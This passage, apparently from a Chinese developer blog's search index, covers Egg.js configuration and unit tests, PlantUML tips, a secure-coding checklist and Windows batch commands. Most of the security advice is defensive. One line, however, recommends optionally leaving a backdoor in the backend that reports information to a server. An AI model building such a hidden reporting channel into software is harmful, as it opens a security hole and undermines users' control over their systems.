<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">session</span> = &#123;</span><br><span class="line">    <span class="attr">key</span>: <span class="string">&#x27;session_id&#x27;</span>,  <span class="comment">// session的名称</span></span><br><span class="line">    <span class="attr">maxAge</span>: <span class="number">10</span> * <span class="number">1000</span>,  <span class="comment">// 有效时间，单位ms</span></span><br><span class="line">    <span class="attr">httpOnly</span>: <span class="literal">true</span>,     <span class="comment">// 是否可以js访问</span></span><br><span class="line">    <span class="attr">encrypt</span>: <span class="literal">true</span>,      <span class="comment">// 是否加密显示</span></span><br><span class="line">    <span class="attr">renew</span>: <span class="literal">true</span>         <span class="comment">// 每次使用是否刷新超时时间</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="2-post请求接收非表单数据"><a href="#2-post请求接收非表单数据" class="headerlink" title="2. post请求接收非表单数据"></a>2. post请求接收非表单数据</h2><ul>
<li>post请求在后台可以接收表单数据直接解析成json，但是非表单数据则收不到</li>
<li>需要修改config配置来接收其他类型数据</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config.xxx.js</span></span><br><span class="line">config.<span class="property">bodyParser</span> = &#123;</span><br><span class="line">	<span class="attr">enable</span>: <span class="literal">true</span>,</span><br><span class="line">	<span class="attr">encoding</span>: <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">	<span class="attr">formLimit</span>: <span class="string">&#x27;100kb&#x27;</span>,</span><br><span class="line">	<span class="attr">jsonLimit</span>: <span class="string">&#x27;100kb&#x27;</span>,</span><br><span class="line">	<span class="attr">strict</span>: <span class="literal">true</span>,</span><br><span class="line">	<span class="comment">// @see https://github.com/hapijs/qs/blob/master/lib/parse.js#L8 for more options</span></span><br><span class="line">	<span class="attr">queryString</span>: &#123;</span><br><span class="line">		<span class="attr">arrayLimit</span>: <span class="number">100</span>,</span><br><span class="line">		<span class="attr">depth</span>: <span class="number">5</span>,</span><br><span class="line">		<span class="attr">parameterLimit</span>: <span class="number">1000</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">enableTypes</span>: [<span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;form&#x27;</span>, <span class="string">&#x27;text&#x27;</span>],</span><br><span class="line">	<span class="attr">extendTypes</span>: &#123;</span><br><span class="line">		<span class="attr">text</span>: [<span class="string">&#x27;text/xml&#x27;</span>, <span class="string">&#x27;application/xml&#x27;</span>],</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="二、单测"><a href="#二、单测" class="headerlink" title="二、单测"></a>二、单测</h1><h2 id="1-环境变量"><a href="#1-环境变量" class="headerlink" title="1. 环境变量"></a>1. 环境变量</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 默认eggjs的 ctx.app.config.env为prod</span></span><br><span class="line"><span class="comment">// 想要改，需要修改 config/env 文件的值，此值优先级更高，更改环境变量会被此值覆盖</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataService</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Service</span> &#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="title function_">defineModels</span>(<span class="params">models</span>) &#123;</span><br><span class="line">		<span class="comment">// 使用此方式可以在单测时跳过一些无法执行的流程</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">ctx</span>.<span class="property">app</span>.<span class="property">config</span>.<span class="property">env</span> === <span class="string">&#x27;unittest&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-分组用例"><a href="#2-分组用例" class="headerlink" title="2. 分组用例"></a>2. 分组用例</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* global beforeEach,  describe, it */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; app, assert &#125; = <span class="built_in">require</span>(<span class="string">&#x27;egg-mock/bootstrap&#x27;</span>);</span><br><span class="line"><span class="comment">// const mm = require(&#x27;egg-mock&#x27;);</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> ctx;</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&#x27;test/service/user.test.js - user&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">beforeEach</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">		<span class="comment">// 将ctx mock一下，可以直接使用ctx.service调用service的方法</span></span><br><span class="line">        ctx = app.<span class="title function_">mockContext</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="title function_">describe</span>(<span class="string">&#x27;_buildValue&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">it</span>(<span class="string">&#x27;build, only first&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">            <span class="keyword">const</span> name = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">            <span class="keyword">const</span> value = <span class="keyword">await</span> ctx.<span class="property">service</span>.<span class="property">user</span>.<span class="title function_">_buildValue</span>(name, &#123;</span><br><span class="line">                <span class="attr">first</span>: <span class="string">&#x27;1234&#x27;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">const</span> expectValue = &#123;</span><br><span class="line">                <span class="attr">first</span>: <span class="string">&#x27;1234&#x27;</span>,</span><br><span class="line">			&#125;;</span><br><span class="line">			<span class="comment">// 深度强制对比，将两个object做对比</span></span><br><span class="line">            assert.<span class="title function_">deepStrictEqual</span>(value, expectValue,</span><br><span class="line">                <span class="string">`value: <span class="subst">$&#123;value&#125;</span> != expectValue <span class="subst">$&#123;expectValue&#125;</span>`</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-csrfToken"><a href="#1-csrfToken" class="headerlink" title="1. csrfToken"></a>1. csrfToken</h2><ul>
<li>eggjs内置一个安全机制，需要在请求post时，带上csrf才能通过校验</li>
<li>csrf在每次请求都会从cookie中的<code>csrfToken</code>字段中传到前台</li>
<li>在下一次请求中需要在header中设置<code>x-csrf-token</code>字段为对应的值</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Nodejs</category>
      </categories>
  </entry>
  <entry>
    <title>plantuml笔记</title>
    <url>/blogs/2020-04-22-plantuml/</url>
    <content><![CDATA[<h1 id="一、语法"><a href="#一、语法" class="headerlink" title="一、语法"></a>一、语法</h1><h2 id="1-主题"><a href="#1-主题" class="headerlink" title="1. 主题"></a>1. 主题</h2><ul>
<li>存在两种语法，theme和skin</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">&#x27; 老版plantuml主题</span><br><span class="line">skin rose</span><br><span class="line">...</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">!theme bluegray</span><br><span class="line">...</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<h1 id="踩坑记和小技巧"><a href="#踩坑记和小技巧" class="headerlink" title="踩坑记和小技巧"></a>踩坑记和小技巧</h1><h2 id="1-显示转义字符"><a href="#1-显示转义字符" class="headerlink" title="1. 显示转义字符"></a>1. 显示转义字符</h2><p>类似<code>_</code>和<code>*</code>这类字符，plantuml会转义成相应的下划线、加粗等。想要不进行转义，可以前面加<code>~</code></p>
<h2 id="2-在线画图展示"><a href="#2-在线画图展示" class="headerlink" title="2. 在线画图展示"></a>2. 在线画图展示</h2><p><a href="http://www.plantuml.com/plantuml/uml/SoWkIImgAStDuSf8pIbGACb8pKqjvd98pKi1YG40">在线画图</a></p>
]]></content>
  </entry>
  <entry>
    <title>安全编码专项笔记</title>
    <url>/blogs/2020-04-03-secure-develop/</url>
    <content><![CDATA[<p>本帖主要记录安全编码需要注意的一些东西，后续可能补充一些案例</p>
<h1 id="一、注意项"><a href="#一、注意项" class="headerlink" title="一、注意项"></a>一、注意项</h1><h2 id="1-设计相关"><a href="#1-设计相关" class="headerlink" title="1. 设计相关"></a>1. 设计相关</h2><h3 id="1-1-系统设计"><a href="#1-1-系统设计" class="headerlink" title="1.1. 系统设计"></a>1.1. 系统设计</h3><p><strong>1. 服务开放</strong></p>
<ul>
<li>所有新增服务需要考虑按需开放，如果没有使用或者配置没有开启，就不要让服务运行，并且把端口用防火墙关闭</li>
<li>所有端口封锁，仅需要开的端口才打开</li>
<li>ssh连接不要一直开放，最好设置某些规则后才能连接</li>
<li>不要相信客户端，最好有一个ssl双向认证的机制，在某个可信的连接将证书下发，后续连接校验此证书</li>
</ul>
<p><strong>2. 命令执行</strong></p>
<ul>
<li>权限尽可能收缩，给代码加钩子只允许代码执行系统极个别命令</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li>看情况在后台留一个后门，用于上报各种信息给服务器，服务器根据信息判断是否被攻击或者篡改等（对于安全要求高的客户），同时可以做一个全量统计</li>
</ul>
<h3 id="1-2-模块设计"><a href="#1-2-模块设计" class="headerlink" title="1.2. 模块设计"></a>1.2. 模块设计</h3><p><strong>1. 外部接口考虑暴力破解或者枚举</strong></p>
<ul>
<li>外部调用的请求之类的接口，要注意鉴权方式。考虑有没有可能通过枚举暴力破解的方式，扫描出一些敏感信息。</li>
<li>正常和异常不要有明显的处理时间的不一致，会导致根据返回时间判断是否是正确的用户名等</li>
</ul>
<p><strong>2. 用户名权限等篡改</strong></p>
<p>接口设计如果有外部输入用户名权限等信息，如果鉴权不够强，可能导致修改绑定的用户名，从而导致数据泄露和权限泄漏</p>
<p><strong>3. 精细化授权</strong></p>
<ul>
<li>管理员需要分级的对每一个模块有读或者读写授权，接口单独分为读接口和写接口，角色创建可以选择不同接口的读写权限</li>
<li>授权判断需要走统一入口，防止绕过</li>
</ul>
<p><strong>4. 密码管理</strong></p>
<ul>
<li>秘钥密码等在数据库储存不能明文，需要原文的可逆加密，不需要的不可逆加密</li>
<li>禁止将密码原文存放到磁盘</li>
<li>一种解决方案: 使用一个随机文本作为加解密的二进制，使用二进制加密密码，将密文存放磁盘，代码中进行解密使用</li>
</ul>
<h2 id="2-编码相关"><a href="#2-编码相关" class="headerlink" title="2. 编码相关"></a>2. 编码相关</h2><ul>
<li>外部输入需要考虑大小问题，是否可能越界</li>
<li>外部输入是否可能存在特殊字符</li>
<li>sql注入</li>
<li>xml注入</li>
<li>编译型二进制必须strip，脚本型能混淆尽量混淆</li>
</ul>
<h1 id="二、威胁应对参考设计方案"><a href="#二、威胁应对参考设计方案" class="headerlink" title="二、威胁应对参考设计方案"></a>二、威胁应对参考设计方案</h1><h2 id="1-枚举暴力破解"><a href="#1-枚举暴力破解" class="headerlink" title="1. 枚举暴力破解"></a>1. 枚举暴力破解</h2><p>接口校验参数格式固定，有可能被暴力循环扫描来枚举出信息，可参考以下方案解决</p>
<ol>
<li>必须在线用户可发请求到接口，session机制</li>
<li>数据整体使用特殊算法生成一个hashid，服务端校验hashid对上才处理数据</li>
<li>ip防爆破检测</li>
<li>前端加ddos防攻击设备</li>
</ol>
<h2 id="2-用户名权限等篡改"><a href="#2-用户名权限等篡改" class="headerlink" title="2. 用户名权限等篡改"></a>2. 用户名权限等篡改</h2><p>接口有外部输入用户名权限等数据时，可能出现被篡改数据，可参考以下方案解决</p>
<ol>
<li>用户名除了登录时需要外部输入进行校验，其余放入在线信息中，外部通过session关联链接，从其中获取用户名和权限，不从外部输入</li>
<li>内部接口则限制ip仅为<code>127.0.0.1</code></li>
</ol>
<h1 id="三、主动防御方案"><a href="#三、主动防御方案" class="headerlink" title="三、主动防御方案"></a>三、主动防御方案</h1><h2 id="1-资源诱饵欺骗"><a href="#1-资源诱饵欺骗" class="headerlink" title="1. 资源诱饵欺骗"></a>1. 资源诱饵欺骗</h2><ul>
<li>在内网设置蜜罐，发布一些假资源，暴露假的账号密码。登陆时抓到攻击者</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Common</category>
      </categories>
      <tags>
        <tag>工程开发</tag>
      </tags>
  </entry>
  <entry>
    <title>windows命令行记录</title>
    <url>/blogs/2020-03-18-windowsBat/</url>
    <content><![CDATA[<h1 id="一、bat-脚本"><a href="#一、bat-脚本" class="headerlink" title="一、bat 脚本"></a>一、bat 脚本</h1><h2 id="1-一些基本语法"><a href="#1-一些基本语法" class="headerlink" title="1. 一些基本语法"></a>1. 一些基本语法</h2><h3 id="1-1-变量"><a href="#1-1-变量" class="headerlink" title="1.1. 变量"></a>1.1. 变量</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 声明变量</span><br><span class="line"><span class="built_in">set</span> test_var=&quot;&quot;</span><br><span class="line">:: 变量赋值</span><br><span class="line"><span class="built_in">set</span> /p test_var=&quot;aaa&quot;</span><br><span class="line">:: 文件内容赋值给变量</span><br><span class="line"><span class="built_in">set</span> /p test_var=&lt;D:\<span class="built_in">path</span>\to\file.txt</span><br></pre></td></tr></table></figure>

<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="comment">REM 这是注释</span></span><br><span class="line">:: 这是注释</span><br><span class="line"></span><br><span class="line">:: 打印环境变量</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%xxx%</span></span><br><span class="line"></span><br><span class="line">:::::::::: 目录操作 ::::::::::</span><br><span class="line">:: 列举目录内容，类似ls</span><br><span class="line"><span class="built_in">dir</span> xxx/xxx</span><br><span class="line"></span><br><span class="line">:::::::::: 文件操作 ::::::::::</span><br><span class="line">:: 新建文件</span><br><span class="line"><span class="built_in">type</span> <span class="built_in">NUL</span> &gt; xxx.txt</span><br><span class="line">:: 删除文件</span><br><span class="line"><span class="built_in">del</span> xxx.txt</span><br></pre></td></tr></table></figure>

<h2 id="2-创建链接-mklink"><a href="#2-创建链接-mklink" class="headerlink" title="2. 创建链接 mklink"></a>2. 创建链接 mklink</h2><ul>
<li><code>/j</code>: 创建目录链接</li>
<li><code>/d</code>: 创建目录符号链接。默认为文件符号链接</li>
<li><code>/h</code>: 创建硬链接而非符号链接</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">mklink /j [link_name] [src_dir]</span><br></pre></td></tr></table></figure>

<p><strong>硬链接、符号链接、目录链接、快捷方式区别</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>硬链接</th>
<th>符号链接</th>
<th>目录链接</th>
<th>快捷方式</th>
</tr>
</thead>
<tbody><tr>
<td>类型</td>
<td>链接</td>
<td>链接</td>
<td>链接</td>
<td>xxx.lnk 文件</td>
</tr>
<tr>
<td>作用对象</td>
<td>仅文件</td>
<td>目录&#x2F;文件</td>
<td>目录&#x2F;文件</td>
<td>目录&#x2F;文件</td>
</tr>
<tr>
<td>大小</td>
<td>和源文件一致（但不占空间）</td>
<td>0</td>
<td>0</td>
<td>几百字节</td>
</tr>
<tr>
<td>源文件删除</td>
<td>文件内容存在</td>
<td>失效</td>
<td>失效</td>
<td>失效</td>
</tr>
<tr>
<td>源文件替换</td>
<td>文件内容还是原始文件</td>
<td>新文件</td>
<td>新文件</td>
<td>新文件</td>
</tr>
<tr>
<td>局限</td>
<td>仅同一个分区</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>路径</td>
<td>-</td>
<td>相对路径</td>
<td>自动转化为绝对路径</td>
<td>-</td>
</tr>
</tbody></table>
<h2 id="3-拷贝文件-COPY-XCOPY"><a href="#3-拷贝文件-COPY-XCOPY" class="headerlink" title="3. 拷贝文件 COPY&#x2F;XCOPY"></a>3. 拷贝文件 COPY&#x2F;XCOPY</h2><h3 id="3-1-COPY"><a href="#3-1-COPY" class="headerlink" title="3.1. COPY"></a>3.1. COPY</h3><ul>
<li>只能复制文件，不能复制文件夹</li>
</ul>
<h4 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h4><ul>
<li><code>/B</code>: 合并文件</li>
<li><code>/Y</code>: 取消覆盖的确认</li>
</ul>
<h4 id="1-合并文件"><a href="#1-合并文件" class="headerlink" title="(1) 合并文件"></a>(1) 合并文件</h4><ul>
<li>合并两个二进制文件</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">COPY</span> /B /Y [bin_file1] [bin_file2]</span><br></pre></td></tr></table></figure>

<h4 id="2-复制单个文件"><a href="#2-复制单个文件" class="headerlink" title="(2) 复制单个文件"></a>(2) 复制单个文件</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 拷贝到目录下</span><br><span class="line"><span class="built_in">COPY</span> /Y C:\aaa.txt D:\</span><br><span class="line">:: 拷贝到目录下换个名字</span><br><span class="line"><span class="built_in">COPY</span> /Y C:\aaa.txt D:\test.bat</span><br></pre></td></tr></table></figure>

<h4 id="3-批量复制文件"><a href="#3-批量复制文件" class="headerlink" title="(3) 批量复制文件"></a>(3) 批量复制文件</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 目录下所有文件复制到另一个目录</span><br><span class="line"><span class="built_in">COPY</span> /Y C:\test\ D:\aaa\</span><br><span class="line">:: 正则匹配</span><br><span class="line"><span class="built_in">COPY</span> /Y C:\test\*.txt D:\aaa\</span><br></pre></td></tr></table></figure>

<h3 id="3-2-XCOPY"><a href="#3-2-XCOPY" class="headerlink" title="3.2. XCOPY"></a>3.2. XCOPY</h3><h4 id="1-选项"><a href="#1-选项" class="headerlink" title="(1) 选项"></a>(1) 选项</h4><ul>
<li><code>/S</code>: 复制目录和子目录，不包括空目录，不带此选项不复制子目录，需要和<code>/E</code>一起复制空目录</li>
<li><code>/T</code>: 只复制目录结构，不复制文件，不包括空目录，需要和<code>/E</code>一起复制空目录</li>
<li><code>/E</code>: 复制空目录</li>
<li><code>/Y</code>: 取消覆盖确认提示</li>
<li><code>/I</code>: 路径不存在的情况，原始路径是目录就自动创建目录，文件则还是会提示选择是否为文件</li>
<li><code>/K</code>: 保留只读属性</li>
<li><code>/V</code>: 验证文件完全相同</li>
</ul>
<h4 id="2-示例"><a href="#2-示例" class="headerlink" title="(2) 示例"></a>(2) 示例</h4><ul>
<li>拷贝文件到目录不能跟文件名，只需要父级目录就好，跟文件名会弹出确认是文件还是目录</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">xcopy</span> /y /k /v C:\<span class="built_in">path</span>\to\file.txt D:\<span class="built_in">path</span>\to\</span><br></pre></td></tr></table></figure>

<h2 id="4-注册表"><a href="#4-注册表" class="headerlink" title="4. 注册表"></a>4. 注册表</h2><h3 id="4-1-获取注册表的值"><a href="#4-1-获取注册表的值" class="headerlink" title="4.1. 获取注册表的值"></a>4.1. 获取注册表的值</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\钉钉&quot; /v &quot;UninstallString&quot;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-修改注册表的值"><a href="#4-2-修改注册表的值" class="headerlink" title="4.2. 修改注册表的值"></a>4.2. 修改注册表的值</h3><ul>
<li>路径</li>
<li><code>/v</code>: key</li>
<li><code>/t</code>: type</li>
<li><code>/d</code>: value</li>
<li><code>/f</code>: 不显示确认输入</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour0  /t REG_SZ /d <span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>   /f</span><br></pre></td></tr></table></figure>

<h2 id="5-for循环"><a href="#5-for循环" class="headerlink" title="5. for循环"></a>5. for循环</h2><h3 id="5-1-基本形态"><a href="#5-1-基本形态" class="headerlink" title="5.1. 基本形态"></a>5.1. 基本形态</h3><ul>
<li>在cmd中使用一个<code>%</code>: <code>for %i in (command1) do command2</code></li>
<li>在batch脚本中使用两个<code>%%</code>: <code>for %%i in (command1) do command2</code></li>
<li><code>%</code>后只能跟一个字母作为变量，不能跟多个字母</li>
</ul>
<h4 id="几个示例"><a href="#几个示例" class="headerlink" title="几个示例"></a>几个示例</h4><p><strong>(1) 数组遍历</strong></p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> <span class="variable">%%i</span> <span class="keyword">in</span> (A,B,C) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> s <span class="variable">%%i</span> e</span><br><span class="line">)</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s A e</span><br><span class="line">s B e</span><br><span class="line">s C e</span><br></pre></td></tr></table></figure>

<h3 id="5-2-for-r-递归遍历目录下所有文件，不包含目录"><a href="#5-2-for-r-递归遍历目录下所有文件，不包含目录" class="headerlink" title="5.2. for &#x2F;r 递归遍历目录下所有文件，不包含目录"></a>5.2. for &#x2F;r 递归遍历目录下所有文件，不包含目录</h3><h4 id="1-原型"><a href="#1-原型" class="headerlink" title="(1) 原型"></a>(1) 原型</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /R [[drive:]<span class="built_in">path</span>] <span class="variable">%%p</span>arameter <span class="keyword">IN</span> (<span class="built_in">set</span>) <span class="keyword">DO</span> command</span><br></pre></td></tr></table></figure>

<h4 id="2-示例-1"><a href="#2-示例-1" class="headerlink" title="(2) 示例"></a>(2) 示例</h4><p><strong>输出目录下包含子目录的所有文件</strong></p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /r D:\<span class="built_in">path</span>\to\<span class="built_in">dir</span> <span class="variable">%%i</span> <span class="keyword">in</span> (*) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> s <span class="variable">%%i</span> e</span><br><span class="line">)</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p><strong>输出目录下包含子目录的所有json文件</strong></p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /r D:\<span class="built_in">path</span>\to\<span class="built_in">dir</span> <span class="variable">%%i</span> <span class="keyword">in</span> (*.json) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> s <span class="variable">%%i</span> e</span><br><span class="line">)</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<h2 id="6-cd命令"><a href="#6-cd命令" class="headerlink" title="6. cd命令"></a>6. cd命令</h2><h3 id="6-1-基本用法"><a href="#6-1-基本用法" class="headerlink" title="6.1. 基本用法"></a>6.1. 基本用法</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: 返回上一级</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">:: 切换盘</span><br><span class="line"><span class="built_in">cd</span> D:</span><br><span class="line">:: 切换到当前盘的相对目录</span><br><span class="line"><span class="built_in">cd</span> a\b\c</span><br><span class="line">:: 切换到不同盘的绝对目录</span><br><span class="line"><span class="built_in">cd</span> /d C:\<span class="built_in">path</span>\to\<span class="built_in">dir</span></span><br></pre></td></tr></table></figure>

<h2 id="7-快捷键"><a href="#7-快捷键" class="headerlink" title="7. 快捷键"></a>7. 快捷键</h2><h3 id="7-1-基本快捷键"><a href="#7-1-基本快捷键" class="headerlink" title="7.1. 基本快捷键"></a>7.1. 基本快捷键</h3><ul>
<li><code>F7</code>: 当次窗口执行过的历史记录，可以选择之前执行过的命令</li>
<li><code>Esc</code>: 清楚当前行</li>
</ul>
<h2 id="8-dir-列举当前目录"><a href="#8-dir-列举当前目录" class="headerlink" title="8. dir 列举当前目录"></a>8. dir 列举当前目录</h2><h3 id="8-1-选项"><a href="#8-1-选项" class="headerlink" title="8.1. 选项"></a>8.1. 选项</h3><ul>
<li><code>/B</code>: 仅显示名字，不显示其他信息，默认显示时间类型</li>
<li><code>/-C</code>: 大小不显示千位数分割符，默认<code>/C</code>显示</li>
<li><code>/Q</code>: 显示所有者，默认不显示</li>
<li><code>/S</code>: 显示子目录</li>
<li><code>/W</code>: 横向排列，目录两旁带<code>[]</code></li>
<li><code>/D</code>: 纵向排列，目录两旁带<code>[]</code></li>
<li><code>/A:[属性]</code>:<ul>
<li><code>d</code>: 目录</li>
<li><code>r</code>: 只读文件</li>
<li><code>s</code>: 系统文件</li>
<li><code>h</code>: 隐藏文件</li>
</ul>
</li>
</ul>
<h3 id="8-2-示例"><a href="#8-2-示例" class="headerlink" title="8.2. 示例"></a>8.2. 示例</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">path</span>\<span class="title">to</span>\<span class="title">dir</span>&gt;<span class="title">dir</span> /<span class="title">d</span></span></span><br><span class="line"><span class="function"> 驱动器 <span class="title">D</span> 中的卷是 新加卷</span></span><br><span class="line"><span class="function"> 卷的序列号是 641<span class="title">B</span>-9<span class="title">BCA</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">D</span>:\<span class="title">path</span>\<span class="title">to</span>\<span class="title">dir</span> 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[.]                .<span class="title">cpplint</span>-<span class="title">ignore</span>    .<span class="title">gitmodules</span>        [<span class="title">cmake</span>]            [<span class="title">doc</span>]              [<span class="title">prebuilt</span>]         [<span class="title">script</span>]           [<span class="title">tests</span>]</span></span><br><span class="line"><span class="function">[..]               .<span class="title">gitignore</span>         [.<span class="title">vscode</span>]          <span class="title">CMakeLists.txt</span>     <span class="title">Doxyfile</span>           <span class="title">README.md</span>          [<span class="title">mobile</span>]           [<span class="title">third</span>-<span class="title">party</span>]</span></span><br><span class="line"><span class="function">.<span class="title">clang</span>-<span class="title">format</span>      [.<span class="title">gitlab</span>]          [<span class="title">build</span>]            <span class="title">cppcheck.xml</span>       [<span class="title">LICENSE</span>]          <span class="title">requirements.txt</span>   [<span class="title">pc</span>]               [<span class="title">tools</span>]</span></span><br><span class="line"><span class="function">.<span class="title">cppcheck</span>-<span class="title">ignore</span>   .<span class="title">gitlab</span>-<span class="title">ci.yml</span>     <span class="title">build.sh</span>           <span class="title">CPPLINT.cfg</span>        [<span class="title">package</span>]          [<span class="title">res</span>]              [<span class="title">src</span>]              <span class="title">version</span></span></span><br><span class="line"><span class="function">              14 个文件        341,406 字节</span></span><br><span class="line"><span class="function">              18 个目录 42,100,445,184 可用字节</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">path</span>\<span class="title">to</span>\<span class="title">dir</span>&gt;<span class="title">dir</span> /<span class="title">w</span></span></span><br><span class="line"><span class="function"> 驱动器 <span class="title">D</span> 中的卷是 新加卷</span></span><br><span class="line"><span class="function"> 卷的序列号是 641<span class="title">B</span>-9<span class="title">BCA</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">D</span>:\<span class="title">path</span>\<span class="title">to</span>\<span class="title">dir</span> 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[.]                [..]               .<span class="title">clang</span>-<span class="title">format</span>      .<span class="title">cppcheck</span>-<span class="title">ignore</span>   .<span class="title">cpplint</span>-<span class="title">ignore</span>    .<span class="title">gitignore</span>         [.<span class="title">gitlab</span>]          .<span class="title">gitlab</span>-<span class="title">ci.yml</span>     .<span class="title">gitmodules</span>        [.<span class="title">vscode</span>]</span></span><br><span class="line"><span class="function">[<span class="title">build</span>]            <span class="title">build.sh</span>           [<span class="title">cmake</span>]            <span class="title">CMakeLists.txt</span>     <span class="title">cppcheck.xml</span>       <span class="title">CPPLINT.cfg</span>        [<span class="title">doc</span>]              <span class="title">Doxyfile</span>           [<span class="title">LICENSE</span>]          [<span class="title">package</span>]</span></span><br><span class="line"><span class="function">[<span class="title">prebuilt</span>]         <span class="title">README.md</span>          <span class="title">requirements.txt</span>   [<span class="title">res</span>]              [<span class="title">script</span>]           [<span class="title">mobile</span>]           [<span class="title">pc</span>]               [<span class="title">src</span>]              [<span class="title">tests</span>]            [<span class="title">third</span>-<span class="title">party</span>]</span></span><br><span class="line"><span class="function">[<span class="title">tools</span>]            <span class="title">version</span></span></span><br><span class="line"><span class="function">              14 个文件        341,406 字节</span></span><br><span class="line"><span class="function">              18 个目录 42,100,436,992 可用字节</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

